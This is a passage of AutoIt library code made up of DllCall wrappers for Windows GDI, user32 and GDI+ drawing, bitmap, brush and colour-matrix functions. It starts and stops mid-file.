		Local $aret = DllCall("gdi32.dll", "int", "SetDIBitsToDevice", "handle", $hdc, "int", $ixdest, "int", $iydest, "dword", $iwidth, "dword", $iheight, "int", $ixsrc, "int", $iysrc, "uint", $istartscan, "uint", $iscanlines, "struct*", $pbits, "struct*", $tbitmapinfo, "uint", $iusage)
		If @error OR ($aret[0] = -1) Then Return SetError(@error + 10, $aret[0], 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setenhmetafilebits($pdata, $ilength)
		Local $aret = DllCall("gdi32.dll", "handle", "SetEnhMetaFileBits", "uint", $ilength, "struct*", $pdata)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setgraphicsmode($hdc, $imode)
		Local $aret = DllCall("gdi32.dll", "int", "SetGraphicsMode", "handle", $hdc, "int", $imode)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setmapmode($hdc, $imode)
		Local $aret = DllCall("gdi32.dll", "int", "SetMapMode", "handle", $hdc, "int", $imode)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setpixel($hdc, $ix, $iy, $irgb)
		Local $aret = DllCall("gdi32.dll", "bool", "SetPixelV", "handle", $hdc, "int", $ix, "int", $iy, "dword", __rgb($irgb))
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setpolyfillmode($hdc, $imode = 1)
		Local $aret = DllCall("gdi32.dll", "int", "SetPolyFillMode", "handle", $hdc, "int", $imode)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setrectrgn($hrgn, $trect)
		Local $aret = DllCall("gdi32.dll", "bool", "SetRectRgn", "handle", $hrgn, "int", DllStructGetData($trect, 1), "int", DllStructGetData($trect, 2), "int", DllStructGetData($trect, 3), "int", DllStructGetData($trect, 4))
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setrop2($hdc, $imode)
		Local $aret = DllCall("gdi32.dll", "int", "SetROP2", "handle", $hdc, "int", $imode)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setstretchbltmode($hdc, $imode)
		Local $aret = DllCall("gdi32.dll", "int", "SetStretchBltMode", "handle", $hdc, "int", $imode)
		If @error OR NOT $aret[0] OR ($aret[0] = 87) Then Return SetError(@error + 10, $aret[0], 0)
		Return $aret[0]
	EndFunc

	Func _winapi_settextalign($hdc, $imode = 0)
		Local $aret = DllCall("gdi32.dll", "uint", "SetTextAlign", "handle", $hdc, "uint", $imode)
		If @error OR ($aret[0] = 4294967295) Then Return SetError(@error, @extended, -1)
		Return $aret[0]
	EndFunc

	Func _winapi_settextcharacterextra($hdc, $icharextra)
		Local $aret = DllCall("gdi32.dll", "int", "SetTextCharacterExtra", "handle", $hdc, "int", $icharextra)
		If @error OR ($aret[0] = -2147483648) Then Return SetError(@error, @extended, -1)
		Return $aret[0]
	EndFunc

	Func _winapi_settextjustification($hdc, $ibreakextra, $ibreakcount)
		Local $aret = DllCall("gdi32.dll", "bool", "SetTextJustification", "handle", $hdc, "int", $ibreakextra, "int", $ibreakcount)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setudfcolormode($imode)
		$__g_irgbmode = NOT ($imode = 0)
	EndFunc

	Func _winapi_setwindowext($hdc, $ixextent, $iyextent)
		$__g_vext = DllStructCreate($tagsize)
		Local $aret = DllCall("gdi32.dll", "bool", "SetWindowExtEx", "handle", $hdc, "int", $ixextent, "int", $iyextent, "struct*", $__g_vext)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setwindoworg($hdc, $ix, $iy)
		$__g_vext = DllStructCreate($tagpoint)
		Local $aret = DllCall("gdi32.dll", "bool", "SetWindowOrgEx", "handle", $hdc, "int", $ix, "int", $iy, "struct*", $__g_vext)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setworldtransform($hdc, ByRef $txform)
		Local $aret = DllCall("gdi32.dll", "bool", "SetWorldTransform", "handle", $hdc, "struct*", $txform)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_stretchblt($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $hsrcdc, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $irop)
		Local $aret = DllCall("gdi32.dll", "bool", "StretchBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "hwnd", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "dword", $irop)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_stretchdibits($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $tbitmapinfo, $iusage, $pbits, $irop)
		Local $aret = DllCall("gdi32.dll", "int", "StretchDIBits", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "struct*", $pbits, "struct*", $tbitmapinfo, "uint", $iusage, "dword", $irop)
		If @error OR ($aret[0] = -1) Then Return SetError(@error + 10, $aret[0], 0)
		Return $aret[0]
	EndFunc

	Func _winapi_strokeandfillpath($hdc)
		Local $aret = DllCall("gdi32.dll", "bool", "StrokeAndFillPath", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_strokepath($hdc)
		Local $aret = DllCall("gdi32.dll", "bool", "StrokePath", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_subtractrect(ByRef $trect1, ByRef $trect2)
		Local $trect = DllStructCreate($tagrect)
		Local $aret = DllCall("user32.dll", "bool", "SubtractRect", "struct*", $trect, "struct*", $trect1, "struct*", $trect2)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $trect
	EndFunc

	Func _winapi_tabbedtextout($hdc, $ix, $iy, $stext, $atab = 0, $istart = 0, $iend = -1, $iorigin = 0)
		Local $itab, $icount
		If NOT IsArray($atab) Then
			If $atab Then
				$itab = $atab
				Dim $atab[1] = [$itab]
				$istart = 0
				$iend = 0
				$icount = 1
			Else
				$icount = 0
			EndIf
		Else
			$icount = 1
		EndIf
		Local $ttab = 0
		If $icount Then
			If __checkerrorarraybounds($atab, $istart, $iend) Then Return SetError(@error + 10, @extended, 0)
			$icount = $iend - $istart + 1
			$ttab = DllStructCreate("uint[" & $icount & "]")
			$itab = 1
			For $i = $istart To $iend
				DllStructSetData($ttab, 1, $atab[$i], $itab)
				$itab += 1
			Next
		EndIf
		Local $aret = DllCall("user32.dll", "long", "TabbedTextOutW", "handle", $hdc, "int", $ix, "int", $iy, "wstr", $stext, "int", StringLen($stext), "int", $icount, "struct*", $ttab, "int", $iorigin)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		$__g_vext = _winapi_createsize(_winapi_loword($aret[0]), _winapi_hiword($aret[0]))
		Return 1
	EndFunc

	Func _winapi_textout($hdc, $ix, $iy, $stext)
		Local $aret = DllCall("gdi32.dll", "bool", "TextOutW", "handle", $hdc, "int", $ix, "int", $iy, "wstr", $stext, "int", StringLen($stext))
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_transparentblt($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $hsrcdc, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $irgb)
		Local $aret = DllCall("gdi32.dll", "bool", "GdiTransparentBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "hwnd", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "dword", __rgb($irgb))
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_unionrect(ByRef $trect1, ByRef $trect2)
		Local $trect = DllStructCreate($tagrect)
		Local $aret = DllCall("user32.dll", "bool", "UnionRect", "struct*", $trect, "struct*", $trect1, "struct*", $trect2)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, 0, 0)
		Return $trect
	EndFunc

	Func _winapi_validaterect($hwnd, $trect = 0)
		Local $aret = DllCall("user32.dll", "bool", "ValidateRect", "hwnd", $hwnd, "struct*", $trect)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_validatergn($hwnd, $hrgn = 0)
		Local $aret = DllCall("user32.dll", "bool", "ValidateRgn", "hwnd", $hwnd, "handle", $hrgn)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_widenpath($hdc)
		Local $aret = DllCall("gdi32.dll", "bool", "WidenPath", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_windowfromdc($hdc)
		Local $aret = DllCall("user32.dll", "hwnd", "WindowFromDC", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

#EndRegion Public Functions
#Region Internal Functions

	Func __enumdisplaymonitorsproc($hmonitor, $hdc, $prect, $lparam)
		#forceref $hDC, $lParam
		__inc($__g_venum)
		$__g_venum[$__g_venum[0][0]][0] = $hmonitor
		If NOT $prect Then
			$__g_venum[$__g_venum[0][0]][1] = 0
		Else
			$__g_venum[$__g_venum[0][0]][1] = DllStructCreate($tagrect)
			If NOT _winapi_movememory(DllStructGetPtr($__g_venum[$__g_venum[0][0]][1]), $prect, 16) Then Return 0
		EndIf
		Return 1
	EndFunc

	Func __enumfontfamiliesproc($pelfex, $pntmex, $ifonttype, $ppattern)
		Local $telfex = DllStructCreate($taglogfont & ";wchar FullName[64];wchar Style[32];wchar Script[32]", $pelfex)
		Local $tntmex = DllStructCreate($tagnewtextmetricex, $pntmex)
		Local $tpattern = DllStructCreate("uint;uint;ptr", $ppattern)
		If $ifonttype AND NOT BitAND($ifonttype, DllStructGetData($tpattern, 1)) Then
			Return 1
		EndIf
		If DllStructGetData($tpattern, 3) Then
			Local $aret = DllCall("shlwapi.dll", "bool", "PathMatchSpecW", "ptr", DllStructGetPtr($telfex, 14), "ptr", DllStructGetData($tpattern, 3))
			If NOT @error Then
				If DllStructGetData($tpattern, 2) Then
					If $aret[0] Then
						Return 1
					Else
					EndIf
				Else
					If $aret[0] Then
					Else
						Return 1
					EndIf
				EndIf
			EndIf
		EndIf
		__inc($__g_venum)
		$__g_venum[$__g_venum[0][0]][0] = DllStructGetData($telfex, 14)
		$__g_venum[$__g_venum[0][0]][1] = DllStructGetData($telfex, 16)
		$__g_venum[$__g_venum[0][0]][2] = DllStructGetData($telfex, 15)
		$__g_venum[$__g_venum[0][0]][3] = DllStructGetData($telfex, 17)
		$__g_venum[$__g_venum[0][0]][4] = $ifonttype
		$__g_venum[$__g_venum[0][0]][5] = DllStructGetData($tntmex, 19)
		$__g_venum[$__g_venum[0][0]][6] = DllStructGetData($tntmex, 20)
		$__g_venum[$__g_venum[0][0]][7] = DllStructGetData($tntmex, 21)
		Return 1
	EndFunc

	Func __enumfontstylesproc($pelfex, $pntmex, $ifonttype, $pfn)
		#forceref $iFontType
		Local $telfex = DllStructCreate($taglogfont & ";wchar FullName[64];wchar Style[32];wchar Script[32]", $pelfex)
		Local $tntmex = DllStructCreate($tagnewtextmetricex, $pntmex)
		Local $tfn = DllStructCreate("dword;wchar[64]", $pfn)
		If BitAND(DllStructGetData($tntmex, "ntmFlags"), 97) = DllStructGetData($tfn, 1) Then
			DllStructSetData($tfn, 2, DllStructGetData($telfex, "FullName"))
			Return 0
		Else
			Return 1
		EndIf
	EndFunc

#EndRegion Internal Functions
Global $__g_hgdipbrush = 0
Global $__g_hgdipdll = 0
Global $__g_hgdippen = 0
Global $__g_igdipref = 0
Global $__g_igdiptoken = 0
Global $__g_bgdip_v1_0 = True

Func _gdiplus_arrowcapcreate($fheight, $fwidth, $bfilled = True)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateAdjustableArrowCap", "float", $fheight, "float", $fwidth, "bool", $bfilled, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[4]
EndFunc

Func _gdiplus_arrowcapdispose($hcap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeleteCustomLineCap", "handle", $hcap)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_arrowcapgetfillstate($harrowcap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetAdjustableArrowCapFillState", "handle", $harrowcap, "bool*", 0)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_arrowcapgetheight($harrowcap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetAdjustableArrowCapHeight", "handle", $harrowcap, "float*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_arrowcapgetmiddleinset($harrowcap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetAdjustableArrowCapMiddleInset", "handle", $harrowcap, "float*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_arrowcapgetwidth($harrowcap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetAdjustableArrowCapWidth", "handle", $harrowcap, "float*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_arrowcapsetfillstate($harrowcap, $bfilled = True)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetAdjustableArrowCapFillState", "handle", $harrowcap, "bool", $bfilled)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_arrowcapsetheight($harrowcap, $fheight)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetAdjustableArrowCapHeight", "handle", $harrowcap, "float", $fheight)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_arrowcapsetmiddleinset($harrowcap, $finset)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetAdjustableArrowCapMiddleInset", "handle", $harrowcap, "float", $finset)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_arrowcapsetwidth($harrowcap, $fwidth)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetAdjustableArrowCapWidth", "handle", $harrowcap, "float", $fwidth)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_bitmapclonearea($hbitmap, $nleft, $ntop, $nwidth, $nheight, $iformat = 137224)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCloneBitmapArea", "float", $nleft, "float", $ntop, "float", $nwidth, "float", $nheight, "int", $iformat, "handle", $hbitmap, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[7]
EndFunc

Func _gdiplus_bitmapcreatedibfrombitmap($hbitmap)
	Local $aret = DllCall($__g_hgdipdll, "uint", "GdipGetImageDimension", "handle", $hbitmap, "float*", 0, "float*", 0)
	If @error OR $aret[0] Then Return SetError(@error + 10, $aret[0], 0)
	Local $tdata = _gdiplus_bitmaplockbits($hbitmap, 0, 0, $aret[2], $aret[3], $gdip_ilmread, $gdip_pxf32argb)
	Local $pbits = DllStructGetData($tdata, "Scan0")
	If NOT $pbits Then Return 0
	Local $tbihdr = DllStructCreate($tagbitmapv5header)
	DllStructSetData($tbihdr, "bV5Size", DllStructGetSize($tbihdr))
	DllStructSetData($tbihdr, "bV5Width", $aret[2])
	DllStructSetData($tbihdr, "bV5Height", $aret[3])
	DllStructSetData($tbihdr, "bV5Planes", 1)
	DllStructSetData($tbihdr, "bV5BitCount", 32)
	DllStructSetData($tbihdr, "bV5Compression", 0)
	DllStructSetData($tbihdr, "bV5SizeImage", $aret[3] * DllStructGetData($tdata, "Stride"))
	DllStructSetData($tbihdr, "bV5AlphaMask", -16777216)
	DllStructSetData($tbihdr, "bV5RedMask", 16711680)
	DllStructSetData($tbihdr, "bV5GreenMask", 65280)
	DllStructSetData($tbihdr, "bV5BlueMask", 255)
	DllStructSetData($tbihdr, "bV5CSType", 2)
	DllStructSetData($tbihdr, "bV5Intent", 4)
	Local $hhbitmapv5 = DllCall("gdi32.dll", "ptr", "CreateDIBSection", "hwnd", 0, "struct*", $tbihdr, "uint", 0, "ptr*", 0, "ptr", 0, "dword", 0)
	If NOT @error AND $hhbitmapv5[0] Then
		DllCall("gdi32.dll", "dword", "SetBitmapBits", "ptr", $hhbitmapv5[0], "dword", $aret[2] * $aret[3] * 4, "ptr", DllStructGetData($tdata, "Scan0"))
		$hhbitmapv5 = $hhbitmapv5[0]
	Else
		$hhbitmapv5 = 0
	EndIf
	_gdiplus_bitmapunlockbits($hbitmap, $tdata)
	$tdata = 0
	$tbihdr = 0
	Return $hhbitmapv5
EndFunc

Func _gdiplus_bitmapcreatefromfile($sfilename)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateBitmapFromFile", "wstr", $sfilename, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_bitmapcreatefromgraphics($iwidth, $iheight, $hgraphics)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateBitmapFromGraphics", "int", $iwidth, "int", $iheight, "handle", $hgraphics, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[4]
EndFunc

Func _gdiplus_bitmapcreatefromhbitmap($hbitmap, $hpal = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateBitmapFromHBITMAP", "handle", $hbitmap, "handle", $hpal, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_bitmapcreatefrommemory($dimage, $bhbitmap = False)
	If NOT IsBinary($dimage) Then Return SetError(1, 0, 0)
	Local $aresult = 0
	Local Const $dmembitmap = Binary($dimage)
	Local Const $ilen = BinaryLen($dmembitmap)
	Local Const $gmem_moveable = 2
	$aresult = DllCall("kernel32.dll", "handle", "GlobalAlloc", "uint", $gmem_moveable, "ulong_ptr", $ilen)
	If @error Then Return SetError(4, 0, 0)
	Local Const $hdata = $aresult[0]
	$aresult = DllCall("kernel32.dll", "ptr", "GlobalLock", "handle", $hdata)
	If @error Then Return SetError(5, 0, 0)
	Local $tmem = DllStructCreate("byte[" & $ilen & "]", $aresult[0])
	DllStructSetData($tmem, 1, $dmembitmap)
	DllCall("kernel32.dll", "bool", "GlobalUnlock", "handle", $hdata)
	If @error Then Return SetError(6, 0, 0)
	Local Const $hstream = _winapi_createstreamonhglobal($hdata)
	If @error Then Return SetError(2, 0, 0)
	Local Const $hbitmap = _gdiplus_bitmapcreatefromstream($hstream)
	If @error Then Return SetError(3, 0, 0)
	DllCall("oleaut32.dll", "long", "DispCallFunc", "ptr", $hstream, "ulong_ptr", 8 * (1 + @AutoItX64), "uint", 4, "ushort", 23, "uint", 0, "ptr", 0, "ptr", 0, "str", "")
	If $bhbitmap Then
		Local Const $hhbmp = _gdiplus_bitmapcreatedibfrombitmap($hbitmap)
		_gdiplus_bitmapdispose($hbitmap)
		Return $hhbmp
	EndIf
	Return $hbitmap
EndFunc

Func _gdiplus_bitmapcreatefromresource($hinst, $vresourcename)
	Local $stype = "int"
	If IsString($vresourcename) Then $stype = "wstr"
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateBitmapFromResource", "handle", $hinst, $stype, $vresourcename, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_bitmapcreatefromscan0($iwidth, $iheight, $ipixelformat = $gdip_pxf32argb, $istride = 0, $pscan0 = 0)
	Local $aresult = DllCall($__g_hgdipdll, "uint", "GdipCreateBitmapFromScan0", "int", $iwidth, "int", $iheight, "int", $istride, "int", $ipixelformat, "struct*", $pscan0, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[6]
EndFunc

Func _gdiplus_bitmapcreatefromstream($pstream)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateBitmapFromStream", "ptr", $pstream, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_bitmapcreatehbitmapfrombitmap($hbitmap, $iargb = -16777216)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateHBITMAPFromBitmap", "handle", $hbitmap, "handle*", 0, "dword", $iargb)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_bitmapdispose($hbitmap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDisposeImage", "handle", $hbitmap)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_bitmapcreatefromhicon($hicon)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateBitmapFromHICON", "handle", $hicon, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_bitmapcreatefromhicon32($hicon)
	Local $tsize = _winapi_geticondimension($hicon)
	Local $iwidth = DllStructGetData($tsize, "X")
	Local $iheight = DllStructGetData($tsize, "Y")
	If $iwidth <= 0 OR $iheight <= 0 Then Return SetError(10, -1, 0)
	Local $tbitmapinfo = DllStructCreate("dword Size;long Width;long Height;word Planes;word BitCount;dword Compression;dword SizeImage;long XPelsPerMeter;long YPelsPerMeter;dword ClrUsed;dword ClrImportant;dword RGBQuad")
	DllStructSetData($tbitmapinfo, "Size", DllStructGetSize($tbitmapinfo) - 4)
	DllStructSetData($tbitmapinfo, "Width", $iwidth)
	DllStructSetData($tbitmapinfo, "Height", -$iheight)
	DllStructSetData($tbitmapinfo, "Planes", 1)
	DllStructSetData($tbitmapinfo, "BitCount", 32)
	DllStructSetData($tbitmapinfo, "Compression", 0)
	DllStructSetData($tbitmapinfo, "SizeImage", 0)
	Local $hdc = _winapi_createcompatibledc(0)
	Local $pbits
	Local $hbmp = _winapi_createdibsection(0, $tbitmapinfo, 0, $pbits)
	Local $horig = _winapi_selectobject($hdc, $hbmp)
	_winapi_drawiconex($hdc, 0, 0, $hicon, $iwidth, $iheight)
	Local $hbitmapicon = _gdiplus_bitmapcreatefromscan0($iwidth, $iheight, $gdip_pxf32argb, $iwidth * 4, $pbits)
	Local $hbitmap = _gdiplus_bitmapcreatefromscan0($iwidth, $iheight)
	Local $hcontext = _gdiplus_imagegetgraphicscontext($hbitmap)
	_gdiplus_graphicsdrawimage($hcontext, $hbitmapicon, 0, 0)
	_gdiplus_graphicsdispose($hcontext)
	_gdiplus_bitmapdispose($hbitmapicon)
	_winapi_selectobject($hdc, $horig)
	_winapi_deletedc($hdc)
	_winapi_deleteobject($hbmp)
	Return $hbitmap
EndFunc

Func _gdiplus_bitmapgetpixel($hbitmap, $ix, $iy)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipBitmapGetPixel", "handle", $hbitmap, "int", $ix, "int", $iy, "uint*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[4]
EndFunc

Func _gdiplus_bitmaplockbits($hbitmap, $ileft, $itop, $iwidth, $iheight, $iflags = $gdip_ilmread, $iformat = $gdip_pxf32rgb)
	Local $tdata = DllStructCreate($taggdipbitmapdata)
	Local $trect = DllStructCreate($tagrect)
	DllStructSetData($trect, "Left", $ileft)
	DllStructSetData($trect, "Top", $itop)
	DllStructSetData($trect, "Right", $iwidth)
	DllStructSetData($trect, "Bottom", $iheight)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipBitmapLockBits", "handle", $hbitmap, "struct*", $trect, "uint", $iflags, "int", $iformat, "struct*", $tdata)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $tdata
EndFunc

Func _gdiplus_bitmapsetpixel($hbitmap, $ix, $iy, $iargb)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipBitmapSetPixel", "handle", $hbitmap, "int", $ix, "int", $iy, "uint", $iargb)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_bitmapsetresolution($hbitmap, $fdpix, $fdpiy)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipBitmapSetResolution", "handle", $hbitmap, "float", $fdpix, "float", $fdpiy)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_bitmapunlockbits($hbitmap, $tbitmapdata)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipBitmapUnlockBits", "handle", $hbitmap, "struct*", $tbitmapdata)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_brushclone($hbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCloneBrush", "handle", $hbrush, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_brushcreatesolid($iargb = -16777216)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateSolidFill", "int", $iargb, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_brushdispose($hbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeleteBrush", "handle", $hbrush)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_brushgetsolidcolor($hbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetSolidFillColor", "handle", $hbrush, "dword*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_brushgettype($hbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetBrushType", "handle", $hbrush, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_brushsetsolidcolor($hbrush, $iargb = -16777216)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetSolidFillColor", "handle", $hbrush, "dword", $iargb)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_colormatrixcreate()
	Return _gdiplus_colormatrixcreatescale(1, 1, 1, 1)
EndFunc

Func _gdiplus_colormatrixcreategrayscale()
	Local $ii, $ij, $tcm, $alums[4] = [$gdip_rlum, $gdip_glum, $gdip_blum, 0]
	$tcm = DllStructCreate($taggdipcolormatrix)
	For $ii = 0 To 3
		For $ij = 1 To 3
			DllStructSetData($tcm, "m", $alums[$ii], $ii * 5 + $ij)
		Next
	Next
	DllStructSetData($tcm, "m", 1, 19)
	DllStructSetData($tcm, "m", 1, 25)
	Return $tcm
EndFunc

Func _gdiplus_colormatrixcreatenegative()
	Local $ii, $tcm
	$tcm = _gdiplus_colormatrixcreatescale(-1, -1, -1, 1)
	For $ii = 1 To 4
		DllStructSetData($tcm, "m", 1, 20 + $ii)
	Next
	Return $tcm
EndFunc

Func _gdiplus_colormatrixcreatesaturation($fsat)
	Local $fsatcomp, $tcm
	$tcm = DllStructCreate($taggdipcolormatrix)
	$fsatcomp = (1 - $fsat)
	DllStructSetData($tcm, "m", $fsatcomp * $gdip_rlum + $fsat, 1)
	DllStructSetData($tcm, "m", $fsatcomp * $gdip_rlum, 2)
	DllStructSetData($tcm, "m", $fsatcomp * $gdip_rlum, 3)
	DllStructSetData($tcm, "m", $fsatcomp * $gdip_glum, 6)
	DllStructSetData($tcm, "m", $fsatcomp * $gdip_glum + $fsat, 7)
	DllStructSetData($tcm, "m", $fsatcomp * $gdip_glum, 8)
